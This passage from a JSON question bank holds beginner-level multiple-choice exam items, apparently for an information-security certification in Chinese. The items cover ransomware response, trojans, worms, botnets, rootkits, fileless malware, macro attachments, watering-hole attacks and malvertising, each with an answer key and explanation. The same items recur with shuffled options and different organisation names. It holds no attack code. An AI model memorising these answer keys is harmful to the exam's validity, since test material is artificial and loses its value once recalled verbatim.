    "explanation": "利用合法廣告網路投放夾帶惡意跳轉或漏洞攻擊代碼之廣告，稱為 Malvertising。",
    "trap": "使用者並未造訪非法網站，僅瀏覽正常新聞即受害，常結合瀏覽器零日漏洞。",
    "law": "ENISA 威脅情勢報告"
  },
  {
    "id": "IPAS-B-331",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某大型連鎖量販流通集團多位員工今晨開機發現桌面背景被置換為勒索信，且個人電腦中的 Office 與 PDF 檔案副檔名全被竄改為未知字串無法讀取。資安人員到場第一步最應執行的緊急應變措施為：",
    "options": [
      "A. 立即將備份硬碟插上受害電腦進行還原",
      "B. 立即重新啟動電腦嘗試修復",
      "C. 立即點擊勒索信中的比特幣連結付款",
      "D. 立即將受害電腦之實體網路線拔除（或中斷無線網路連線），執行緊急網路隔離"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "遭遇勒索軟體，第一優先任務是『隔離遏止』，立即拔除網路線防止惡意程式在內網持續橫向擴散。",
    "trap": "重開機會抹除記憶體證據，直接插上備份碟會導致備份資料連帶遭勒索軟體加密！",
    "law": "NIST SP 800-61 事件應變指南"
  },
  {
    "id": "IPAS-B-332",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某區域教學醫學中心一名工程師從不明論壇下載號稱「免費正版繪圖軟體破解版」，安裝後軟體雖看似可正常運作，但系統後台卻被靜默植入隱蔽服務，每晚定期向境外主機傳送螢幕截圖。此惡意程式屬於：",
    "options": [
      "A. 網站漏洞（SQL Injection）",
      "B. 電腦蠕蟲（Worm）",
      "C. 邏輯炸彈（Logic Bomb）",
      "D. 特洛伊木馬（Trojan Horse）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "Trojan",
        "zh": "特洛伊木馬",
        "ipa": "/ˈtroʊ.dʒən/"
      },
      {
        "en": "Worm",
        "zh": "電腦蠕蟲",
        "ipa": "/wɝːm/"
      },
      {
        "en": "SQL Injection",
        "zh": "SQL 注入攻擊",
        "ipa": "/ˌes.kjuːˈel ɪnˈdʒek.ʃən/"
      }
    ],
    "explanation": "偽裝成正常合法軟體，誘騙使用者自行安裝，背後執行惡意後門行為，即為特洛伊木馬之經典定義。",
    "trap": "木馬不具備自主網路掃描自我繁殖能力，多靠偽裝誘導安裝。",
    "law": "MITRE ATT&CK T1204"
  },
  {
    "id": "IPAS-B-333",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某公務機關資訊處內部網段中有一台老舊伺服器未安裝最新安全補丁，突然在 10 分鐘內，同網段超過 80 台 Windows 電腦全數感染同種惡意程式，且並無任何員工點擊釣魚信。此惡意程式最可能具備下列何種特性？",
    "options": [
      "A. 勒索軟體必須由黑客人工手動逐台輸入密碼",
      "B. 跨網站腳本必須由瀏覽器觸發",
      "C. 巨集病毒必須由使用者手動開啟檔案",
      "D. 電腦蠕蟲（Worm）具備自主掃描網路漏洞並自我傳播的能力"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "Worm",
        "zh": "電腦蠕蟲",
        "ipa": "/wɝːm/"
      }
    ],
    "explanation": "蠕蟲（如 WannaCry）不需人為點擊介入，利用未修補之網路協定弱點（如 SMB）即能自體高速橫向擴散感染。",
    "trap": "能在短時間內無感感染整片網段者通常為蠕蟲行為。",
    "law": "CERT 資安威脅分類手冊"
  },
  {
    "id": "IPAS-B-334",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某公務機關資訊處監控設備發現內部數百台 IoT 智慧監視器半夜產生異常巨量 UDP 流量衝擊境外某金融網站，經查此批設備預設密碼未改遭黑客入侵並納入控制。這些受控設備在資安術語中被稱為：",
    "options": [
      "A. 蜜罐（Honeypot）",
      "B. 殭屍節點（Botnet / Bots）",
      "C. 負載平衡器（Load Balancer）",
      "D. 代理伺服器（Proxy）"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "DDoS",
        "zh": "分散式阻斷服務攻擊",
        "ipa": "/ˌdiːˈdɑːs/"
      },
      {
        "en": "Botnet",
        "zh": "殭屍網路",
        "ipa": "/ˈbɑːt.net/"
      }
    ],
    "explanation": "受黑客植入後門並受控於 C2 伺服器進行分散式阻斷服務（DDoS）攻擊的主機或 IoT 設備稱為 Botnet（殭屍網路）。",
    "trap": "弱密碼或未打補丁的 IoT 設備是現代 Botnet 的主要溫床。",
    "law": "OWASP IoT Top 10"
  },
  {
    "id": "IPAS-B-335",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心資安鑑識工程師在排查一台疑似遭進階滲透的主機時，發現使用一般工作管理員完全看不到可疑進程，但網路連線卻持續向外傳輸機密。攻擊者最可能植入了何種技術以隱藏其行蹤？",
    "options": [
      "A. 廣告軟體（Adware）",
      "B. Rootkit（管理者工具包 / 隱匿工具）",
      "C. 鍵盤側錄器（Keylogger）",
      "D. 勒索軟體（Ransomware）"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "Ransomware",
        "zh": "勒索軟體",
        "ipa": "/ˈræn.səm.wer/"
      },
      {
        "en": "Rootkit",
        "zh": "管理者工具包 / 隱匿木馬",
        "ipa": "/ˈruːt.kɪt/"
      }
    ],
    "explanation": "Rootkit 往往深入作業系統核心層（Kernel mode），攔截並竄改系統 API（Hooking），使一般管理工具隱形無法顯示該惡意進程。",
    "trap": "防禦需依賴安全開機（Secure Boot）與底層 EDR 偵測。",
    "law": "MITRE ATT&CK T1014"
  },
  {
    "id": "IPAS-B-336",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某國立頂尖研究型大學資安監控中心（SOC）偵測到某端點電腦的 PowerShell 正在記憶體中載入 Base64 編碼的惡意代碼，但主機硬碟掃描卻完全未發現任何實體惡意檔案落盤。此型態攻擊稱為：",
    "options": [
      "A. 磁碟壞軌故障",
      "B. 網路釣魚攻擊",
      "C. 無檔案惡意程式（Fileless Malware）",
      "D. 傳統開機區引導病毒"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "無檔案惡意程式不將實體 exe 寫入硬碟，而是寄生於合法系統工具（如 PowerShell, WMI）在 RAM 記憶體中執行，藉以規避傳統防毒軟體靜態特徵碼檢查。",
    "trap": "防範此威脅必須仰賴端點 EDR 之動態行為監控。",
    "law": "MITRE ATT&CK Living Off The Land"
  },
  {
    "id": "IPAS-B-337",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某知名大型網路電商平台人資部門同仁收到一封自稱是某國立大學應徵實習生的求職信，信件內附帶名為「履歷表.docx」之檔案，開啟後提示「請啟用巨集以檢視完整排版」。同仁應如何處置？",
    "options": [
      "A. 忽略警告直接填寫個人資料",
      "B. 將檔案轉寄給全公司同仁幫忙確認",
      "C. 立即點擊啟用巨集以確認真實姓名",
      "D. 絕對不點擊啟用巨集，並立即通報資安團隊進行沙箱檢測與阻絕"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "求職信附件夾帶 Office 文件並提示啟用巨集，為最常見之惡意載具投放手法，啟用巨集即等於同意執行惡意 VBA 代碼。",
    "trap": "企業應預設禁用來自網路之 Office 巨集。",
    "law": "CISA 惡意巨集防護指南"
  },
  {
    "id": "IPAS-B-338",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某跨國金融控股銀行資安團隊發現研發工程師常造訪的一個專業晶片論壇網站遭黑客植入惡意腳本，任何前往該論壇瀏覽的同仁若瀏覽器未打補丁便會被自動下載後門。此攻擊手法屬於：",
    "options": [
      "A. 阻斷服務攻擊（DDoS）",
      "B. 水坑攻擊（Watering Hole Attack）",
      "C. 實體尾隨入侵",
      "D. 字典檔暴力破解攻擊"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "Watering Hole",
        "zh": "水坑攻擊",
        "ipa": "/ˈwɑː.t̬ɚ.ɪŋ hoʊl/"
      },
      {
        "en": "DDoS",
        "zh": "分散式阻斷服務攻擊",
        "ipa": "/ˌdiːˈdɑːs/"
      }
    ],
    "explanation": "水坑攻擊如同獵人在動物飲水的水坑埋伏，黑客預先攻陷目標群體常訪的合法垂直領域網站，伺機攻擊造訪者。",
    "trap": "防護重點在於端點瀏覽器與作業系統隨時修補最新補丁。",
    "law": "MITRE ATT&CK T1189"
  },
  {
    "id": "IPAS-B-339",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某大型連鎖量販流通集團為全面杜絕微軟 Office 巨集病毒（Macro Virus）肆虐，IT 部門應透過群組原則（GPO）採取何項最佳配置？",
    "options": [
      "A. 停用 Windows Update",
      "B. 開放所有巨集無需提醒",
      "C. 僅要求同仁自行辨識信箱來源",
      "D. 強制停用所有來自網際網路下載之 Office 檔案中的巨集執行（Block macros from running）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "微軟最新政策與最佳實務均為：透過 GPO 封鎖所有自外網標籤（Mark of the Web, MOTW）下載檔案之巨集執行。",
    "trap": "行政宣導效果有限，必須從作業系統原則予以強制禁用。",
    "law": "微軟 Office 安全組態指南"
  },
  {
    "id": "IPAS-B-340",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某高科技晶圓代工大廠資安通報顯示某攻擊者入侵了知名新聞媒體網站的第三方廣告聯播系統，使訪客在瀏覽正常新聞時被無感重定向至掛馬網站。此攻擊手法稱為：",
    "options": [
      "A. 惡意廣告攻擊（Malvertising）",
      "B. 網路釣魚（Phishing）",
      "C. 社交工程（Social Engineering）",
      "D. 中間人攻擊（MitM）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "Phishing",
        "zh": "網路釣魚",
        "ipa": "/ˈfɪʃ.ɪŋ/"
      },
      {
        "en": "MitM",
        "zh": "中間人攻擊",
        "ipa": "/mæn ɪn ðə ˈmɪd.əl/"
      }
    ],
    "explanation": "利用合法廣告網路投放夾帶惡意跳轉或漏洞攻擊代碼之廣告，稱為 Malvertising。",
    "trap": "使用者並未造訪非法網站，僅瀏覽正常新聞即受害，常結合瀏覽器零日漏洞。",
    "law": "ENISA 威脅情勢報告"
  },
  {
    "id": "IPAS-B-341",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠多位員工今晨開機發現桌面背景被置換為勒索信，且個人電腦中的 Office 與 PDF 檔案副檔名全被竄改為未知字串無法讀取。資安人員到場第一步最應執行的緊急應變措施為：",
    "options": [
      "A. 立即重新啟動電腦嘗試修復",
      "B. 立即將備份硬碟插上受害電腦進行還原",
      "C. 立即將受害電腦之實體網路線拔除（或中斷無線網路連線），執行緊急網路隔離",
      "D. 立即點擊勒索信中的比特幣連結付款"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "遭遇勒索軟體，第一優先任務是『隔離遏止』，立即拔除網路線防止惡意程式在內網持續橫向擴散。",
    "trap": "重開機會抹除記憶體證據，直接插上備份碟會導致備份資料連帶遭勒索軟體加密！",
    "law": "NIST SP 800-61 事件應變指南"
  },
  {
    "id": "IPAS-B-342",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某區域教學醫學中心一名工程師從不明論壇下載號稱「免費正版繪圖軟體破解版」，安裝後軟體雖看似可正常運作，但系統後台卻被靜默植入隱蔽服務，每晚定期向境外主機傳送螢幕截圖。此惡意程式屬於：",
    "options": [
      "A. 電腦蠕蟲（Worm）",
      "B. 邏輯炸彈（Logic Bomb）",
      "C. 特洛伊木馬（Trojan Horse）",
      "D. 網站漏洞（SQL Injection）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "Trojan",
        "zh": "特洛伊木馬",
        "ipa": "/ˈtroʊ.dʒən/"
      },
      {
        "en": "Worm",
        "zh": "電腦蠕蟲",
        "ipa": "/wɝːm/"
      },
      {
        "en": "SQL Injection",
        "zh": "SQL 注入攻擊",
        "ipa": "/ˌes.kjuːˈel ɪnˈdʒek.ʃən/"
      }
    ],
    "explanation": "偽裝成正常合法軟體，誘騙使用者自行安裝，背後執行惡意後門行為，即為特洛伊木馬之經典定義。",
    "trap": "木馬不具備自主網路掃描自我繁殖能力，多靠偽裝誘導安裝。",
    "law": "MITRE ATT&CK T1204"
  },
  {
    "id": "IPAS-B-343",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商內部網段中有一台老舊伺服器未安裝最新安全補丁，突然在 10 分鐘內，同網段超過 80 台 Windows 電腦全數感染同種惡意程式，且並無任何員工點擊釣魚信。此惡意程式最可能具備下列何種特性？",
    "options": [
      "A. 巨集病毒必須由使用者手動開啟檔案",
      "B. 跨網站腳本必須由瀏覽器觸發",
      "C. 勒索軟體必須由黑客人工手動逐台輸入密碼",
      "D. 電腦蠕蟲（Worm）具備自主掃描網路漏洞並自我傳播的能力"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "Worm",
        "zh": "電腦蠕蟲",
        "ipa": "/wɝːm/"
      }
    ],
    "explanation": "蠕蟲（如 WannaCry）不需人為點擊介入，利用未修補之網路協定弱點（如 SMB）即能自體高速橫向擴散感染。",
    "trap": "能在短時間內無感感染整片網段者通常為蠕蟲行為。",
    "law": "CERT 資安威脅分類手冊"
  },
  {
    "id": "IPAS-B-344",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某大型連鎖量販流通集團監控設備發現內部數百台 IoT 智慧監視器半夜產生異常巨量 UDP 流量衝擊境外某金融網站，經查此批設備預設密碼未改遭黑客入侵並納入控制。這些受控設備在資安術語中被稱為：",
    "options": [
      "A. 殭屍節點（Botnet / Bots）",
      "B. 負載平衡器（Load Balancer）",
      "C. 蜜罐（Honeypot）",
      "D. 代理伺服器（Proxy）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "DDoS",
        "zh": "分散式阻斷服務攻擊",
        "ipa": "/ˌdiːˈdɑːs/"
      },
      {
        "en": "Botnet",
        "zh": "殭屍網路",
        "ipa": "/ˈbɑːt.net/"
      }
    ],
    "explanation": "受黑客植入後門並受控於 C2 伺服器進行分散式阻斷服務（DDoS）攻擊的主機或 IoT 設備稱為 Botnet（殭屍網路）。",
    "trap": "弱密碼或未打補丁的 IoT 設備是現代 Botnet 的主要溫床。",
    "law": "OWASP IoT Top 10"
  },
  {
    "id": "IPAS-B-345",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某區域教學醫學中心資安鑑識工程師在排查一台疑似遭進階滲透的主機時，發現使用一般工作管理員完全看不到可疑進程，但網路連線卻持續向外傳輸機密。攻擊者最可能植入了何種技術以隱藏其行蹤？",
    "options": [
      "A. Rootkit（管理者工具包 / 隱匿工具）",
      "B. 廣告軟體（Adware）",
      "C. 鍵盤側錄器（Keylogger）",
      "D. 勒索軟體（Ransomware）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "Ransomware",
        "zh": "勒索軟體",
        "ipa": "/ˈræn.səm.wer/"
      },
      {
        "en": "Rootkit",
        "zh": "管理者工具包 / 隱匿木馬",
        "ipa": "/ˈruːt.kɪt/"
      }
    ],
    "explanation": "Rootkit 往往深入作業系統核心層（Kernel mode），攔截並竄改系統 API（Hooking），使一般管理工具隱形無法顯示該惡意進程。",
    "trap": "防禦需依賴安全開機（Secure Boot）與底層 EDR 偵測。",
    "law": "MITRE ATT&CK T1014"
  },
  {
    "id": "IPAS-B-346",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某國立頂尖研究型大學資安監控中心（SOC）偵測到某端點電腦的 PowerShell 正在記憶體中載入 Base64 編碼的惡意代碼，但主機硬碟掃描卻完全未發現任何實體惡意檔案落盤。此型態攻擊稱為：",
    "options": [
      "A. 傳統開機區引導病毒",
      "B. 磁碟壞軌故障",
      "C. 網路釣魚攻擊",
      "D. 無檔案惡意程式（Fileless Malware）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "無檔案惡意程式不將實體 exe 寫入硬碟，而是寄生於合法系統工具（如 PowerShell, WMI）在 RAM 記憶體中執行，藉以規避傳統防毒軟體靜態特徵碼檢查。",
    "trap": "防範此威脅必須仰賴端點 EDR 之動態行為監控。",
    "law": "MITRE ATT&CK Living Off The Land"
  },
  {
    "id": "IPAS-B-347",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某區域教學醫學中心人資部門同仁收到一封自稱是某國立大學應徵實習生的求職信，信件內附帶名為「履歷表.docx」之檔案，開啟後提示「請啟用巨集以檢視完整排版」。同仁應如何處置？",
    "options": [
      "A. 立即點擊啟用巨集以確認真實姓名",
      "B. 忽略警告直接填寫個人資料",
      "C. 將檔案轉寄給全公司同仁幫忙確認",
      "D. 絕對不點擊啟用巨集，並立即通報資安團隊進行沙箱檢測與阻絕"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "求職信附件夾帶 Office 文件並提示啟用巨集，為最常見之惡意載具投放手法，啟用巨集即等於同意執行惡意 VBA 代碼。",
    "trap": "企業應預設禁用來自網路之 Office 巨集。",
    "law": "CISA 惡意巨集防護指南"
  },
  {
    "id": "IPAS-B-348",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心資安團隊發現研發工程師常造訪的一個專業晶片論壇網站遭黑客植入惡意腳本，任何前往該論壇瀏覽的同仁若瀏覽器未打補丁便會被自動下載後門。此攻擊手法屬於：",
    "options": [
      "A. 水坑攻擊（Watering Hole Attack）",
      "B. 阻斷服務攻擊（DDoS）",
      "C. 字典檔暴力破解攻擊",
      "D. 實體尾隨入侵"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "Watering Hole",
        "zh": "水坑攻擊",
        "ipa": "/ˈwɑː.t̬ɚ.ɪŋ hoʊl/"
      },
      {
        "en": "DDoS",
        "zh": "分散式阻斷服務攻擊",
        "ipa": "/ˌdiːˈdɑːs/"
      }
    ],
    "explanation": "水坑攻擊如同獵人在動物飲水的水坑埋伏，黑客預先攻陷目標群體常訪的合法垂直領域網站，伺機攻擊造訪者。",
    "trap": "防護重點在於端點瀏覽器與作業系統隨時修補最新補丁。",
    "law": "MITRE ATT&CK T1189"
  },
  {
    "id": "IPAS-B-349",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某金流與行動支付科技公司為全面杜絕微軟 Office 巨集病毒（Macro Virus）肆虐，IT 部門應透過群組原則（GPO）採取何項最佳配置？",
    "options": [
      "A. 強制停用所有來自網際網路下載之 Office 檔案中的巨集執行（Block macros from running）",
      "B. 僅要求同仁自行辨識信箱來源",
      "C. 開放所有巨集無需提醒",
      "D. 停用 Windows Update"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "微軟最新政策與最佳實務均為：透過 GPO 封鎖所有自外網標籤（Mark of the Web, MOTW）下載檔案之巨集執行。",
    "trap": "行政宣導效果有限，必須從作業系統原則予以強制禁用。",
    "law": "微軟 Office 安全組態指南"
  },
  {
    "id": "IPAS-B-350",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某知名大型網路電商平台資安通報顯示某攻擊者入侵了知名新聞媒體網站的第三方廣告聯播系統，使訪客在瀏覽正常新聞時被無感重定向至掛馬網站。此攻擊手法稱為：",
    "options": [
      "A. 社交工程（Social Engineering）",
      "B. 網路釣魚（Phishing）",
      "C. 中間人攻擊（MitM）",
      "D. 惡意廣告攻擊（Malvertising）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "Phishing",
        "zh": "網路釣魚",
        "ipa": "/ˈfɪʃ.ɪŋ/"
      },
      {
        "en": "MitM",
        "zh": "中間人攻擊",
        "ipa": "/mæn ɪn ðə ˈmɪd.əl/"
      }
    ],
    "explanation": "利用合法廣告網路投放夾帶惡意跳轉或漏洞攻擊代碼之廣告，稱為 Malvertising。",
    "trap": "使用者並未造訪非法網站，僅瀏覽正常新聞即受害，常結合瀏覽器零日漏洞。",
    "law": "ENISA 威脅情勢報告"
  },
  {
    "id": "IPAS-B-351",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某跨國金融控股銀行多位員工今晨開機發現桌面背景被置換為勒索信，且個人電腦中的 Office 與 PDF 檔案副檔名全被竄改為未知字串無法讀取。資安人員到場第一步最應執行的緊急應變措施為：",
    "options": [
      "A. 立即將受害電腦之實體網路線拔除（或中斷無線網路連線），執行緊急網路隔離",
      "B. 立即重新啟動電腦嘗試修復",
      "C. 立即將備份硬碟插上受害電腦進行還原",
      "D. 立即點擊勒索信中的比特幣連結付款"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "遭遇勒索軟體，第一優先任務是『隔離遏止』，立即拔除網路線防止惡意程式在內網持續橫向擴散。",
    "trap": "重開機會抹除記憶體證據，直接插上備份碟會導致備份資料連帶遭勒索軟體加密！",
    "law": "NIST SP 800-61 事件應變指南"
  },
  {
    "id": "IPAS-B-352",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團一名工程師從不明論壇下載號稱「免費正版繪圖軟體破解版」，安裝後軟體雖看似可正常運作，但系統後台卻被靜默植入隱蔽服務，每晚定期向境外主機傳送螢幕截圖。此惡意程式屬於：",
    "options": [
      "A. 電腦蠕蟲（Worm）",
      "B. 網站漏洞（SQL Injection）",
      "C. 特洛伊木馬（Trojan Horse）",
      "D. 邏輯炸彈（Logic Bomb）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "Trojan",
        "zh": "特洛伊木馬",
        "ipa": "/ˈtroʊ.dʒən/"
      },
      {
        "en": "Worm",
        "zh": "電腦蠕蟲",
        "ipa": "/wɝːm/"
      },
      {
        "en": "SQL Injection",
        "zh": "SQL 注入攻擊",
        "ipa": "/ˌes.kjuːˈel ɪnˈdʒek.ʃən/"
      }
    ],
    "explanation": "偽裝成正常合法軟體，誘騙使用者自行安裝，背後執行惡意後門行為，即為特洛伊木馬之經典定義。",
    "trap": "木馬不具備自主網路掃描自我繁殖能力，多靠偽裝誘導安裝。",
    "law": "MITRE ATT&CK T1204"
  },
  {
    "id": "IPAS-B-353",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某大型連鎖量販流通集團內部網段中有一台老舊伺服器未安裝最新安全補丁，突然在 10 分鐘內，同網段超過 80 台 Windows 電腦全數感染同種惡意程式，且並無任何員工點擊釣魚信。此惡意程式最可能具備下列何種特性？",
    "options": [
      "A. 巨集病毒必須由使用者手動開啟檔案",
      "B. 跨網站腳本必須由瀏覽器觸發",
      "C. 勒索軟體必須由黑客人工手動逐台輸入密碼",
      "D. 電腦蠕蟲（Worm）具備自主掃描網路漏洞並自我傳播的能力"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "Worm",
        "zh": "電腦蠕蟲",
        "ipa": "/wɝːm/"
      }
    ],
    "explanation": "蠕蟲（如 WannaCry）不需人為點擊介入，利用未修補之網路協定弱點（如 SMB）即能自體高速橫向擴散感染。",
    "trap": "能在短時間內無感感染整片網段者通常為蠕蟲行為。",
    "law": "CERT 資安威脅分類手冊"
  },
  {
    "id": "IPAS-B-354",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心監控設備發現內部數百台 IoT 智慧監視器半夜產生異常巨量 UDP 流量衝擊境外某金融網站，經查此批設備預設密碼未改遭黑客入侵並納入控制。這些受控設備在資安術語中被稱為：",
    "options": [
      "A. 負載平衡器（Load Balancer）",
      "B. 代理伺服器（Proxy）",
      "C. 殭屍節點（Botnet / Bots）",
      "D. 蜜罐（Honeypot）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "DDoS",
        "zh": "分散式阻斷服務攻擊",
        "ipa": "/ˌdiːˈdɑːs/"
      },
      {
        "en": "Botnet",
        "zh": "殭屍網路",
        "ipa": "/ˈbɑːt.net/"
      }
    ],
    "explanation": "受黑客植入後門並受控於 C2 伺服器進行分散式阻斷服務（DDoS）攻擊的主機或 IoT 設備稱為 Botnet（殭屍網路）。",
    "trap": "弱密碼或未打補丁的 IoT 設備是現代 Botnet 的主要溫床。",
    "law": "OWASP IoT Top 10"
  },
  {
    "id": "IPAS-B-355",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心資安鑑識工程師在排查一台疑似遭進階滲透的主機時，發現使用一般工作管理員完全看不到可疑進程，但網路連線卻持續向外傳輸機密。攻擊者最可能植入了何種技術以隱藏其行蹤？",
    "options": [
      "A. 鍵盤側錄器（Keylogger）",
      "B. 廣告軟體（Adware）",
      "C. Rootkit（管理者工具包 / 隱匿工具）",
      "D. 勒索軟體（Ransomware）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "Ransomware",
        "zh": "勒索軟體",
        "ipa": "/ˈræn.səm.wer/"
      },
      {
        "en": "Rootkit",
        "zh": "管理者工具包 / 隱匿木馬",
        "ipa": "/ˈruːt.kɪt/"
      }
    ],
    "explanation": "Rootkit 往往深入作業系統核心層（Kernel mode），攔截並竄改系統 API（Hooking），使一般管理工具隱形無法顯示該惡意進程。",
    "trap": "防禦需依賴安全開機（Secure Boot）與底層 EDR 偵測。",
    "law": "MITRE ATT&CK T1014"
  },
  {
    "id": "IPAS-B-356",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某金流與行動支付科技公司資安監控中心（SOC）偵測到某端點電腦的 PowerShell 正在記憶體中載入 Base64 編碼的惡意代碼，但主機硬碟掃描卻完全未發現任何實體惡意檔案落盤。此型態攻擊稱為：",
    "options": [
      "A. 傳統開機區引導病毒",
      "B. 磁碟壞軌故障",
      "C. 無檔案惡意程式（Fileless Malware）",
      "D. 網路釣魚攻擊"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "無檔案惡意程式不將實體 exe 寫入硬碟，而是寄生於合法系統工具（如 PowerShell, WMI）在 RAM 記憶體中執行，藉以規避傳統防毒軟體靜態特徵碼檢查。",
    "trap": "防範此威脅必須仰賴端點 EDR 之動態行為監控。",
    "law": "MITRE ATT&CK Living Off The Land"
  },
  {
    "id": "IPAS-B-357",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某大型連鎖量販流通集團人資部門同仁收到一封自稱是某國立大學應徵實習生的求職信，信件內附帶名為「履歷表.docx」之檔案，開啟後提示「請啟用巨集以檢視完整排版」。同仁應如何處置？",
    "options": [
      "A. 絕對不點擊啟用巨集，並立即通報資安團隊進行沙箱檢測與阻絕",
      "B. 忽略警告直接填寫個人資料",
      "C. 將檔案轉寄給全公司同仁幫忙確認",
      "D. 立即點擊啟用巨集以確認真實姓名"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "求職信附件夾帶 Office 文件並提示啟用巨集，為最常見之惡意載具投放手法，啟用巨集即等於同意執行惡意 VBA 代碼。",
    "trap": "企業應預設禁用來自網路之 Office 巨集。",
    "law": "CISA 惡意巨集防護指南"
  },
  {
    "id": "IPAS-B-358",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某跨國金融控股銀行資安團隊發現研發工程師常造訪的一個專業晶片論壇網站遭黑客植入惡意腳本，任何前往該論壇瀏覽的同仁若瀏覽器未打補丁便會被自動下載後門。此攻擊手法屬於：",
    "options": [
      "A. 阻斷服務攻擊（DDoS）",
      "B. 水坑攻擊（Watering Hole Attack）",
      "C. 字典檔暴力破解攻擊",
      "D. 實體尾隨入侵"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "Watering Hole",
        "zh": "水坑攻擊",
        "ipa": "/ˈwɑː.t̬ɚ.ɪŋ hoʊl/"
      },
      {
        "en": "DDoS",
        "zh": "分散式阻斷服務攻擊",
        "ipa": "/ˌdiːˈdɑːs/"
      }
    ],
    "explanation": "水坑攻擊如同獵人在動物飲水的水坑埋伏，黑客預先攻陷目標群體常訪的合法垂直領域網站，伺機攻擊造訪者。",
    "trap": "防護重點在於端點瀏覽器與作業系統隨時修補最新補丁。",
    "law": "MITRE ATT&CK T1189"
  },
  {
    "id": "IPAS-B-359",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某大型連鎖量販流通集團為全面杜絕微軟 Office 巨集病毒（Macro Virus）肆虐，IT 部門應透過群組原則（GPO）採取何項最佳配置？",
    "options": [
      "A. 僅要求同仁自行辨識信箱來源",
